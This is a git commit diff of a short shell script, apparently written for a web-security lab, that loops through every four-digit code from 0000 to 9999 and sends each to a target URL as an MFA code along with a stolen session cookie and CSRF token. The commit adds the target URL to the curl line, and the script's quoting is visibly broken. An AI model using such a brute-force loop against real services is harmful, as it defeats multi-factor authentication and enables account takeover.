7ba5357d2c06edd5af3cda6f848dfeed8588a2bd
Etum <catsarebestthing@outlook.com>
2020-09-19 23:02:23 +0200

    Update curl4burp.sh

--- Tests/curl4burp.sh
+++ Tests/curl4burp.sh
@@ -8,7 +8,8 @@ read cookie
 echo 'enter the csrf token: '
 read csrf
 for num in {0000..9999}; do
-curl -A 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -b session=$cookie;csrf=$csrf&mfa-code=$num >
+curl -A 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -b session=$cookie;csrf=$csrf&mfa-code=$num http://$url
+
 #url not specified. maybe -b does not work with multiple cookies? Write cookies into file and use -c cookies.txt
 done
 
